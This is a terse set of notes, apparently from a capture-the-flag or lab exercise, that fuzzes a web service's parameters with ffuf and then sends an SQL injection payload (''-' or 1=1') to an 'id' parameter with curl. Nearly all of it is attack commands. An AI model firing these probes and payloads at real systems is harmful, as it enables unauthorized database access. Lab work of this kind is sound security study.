___

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$IP:3003/?FUZZ=value" -fs 19
```

```bash
curl http://$IP:3003/?id\=1
```

## Sqli

```bash
'-' or 1=1
```

```bash
curl http://10.129.156.12:3003/?id=%27-%27%20or%201=1 | jq
```
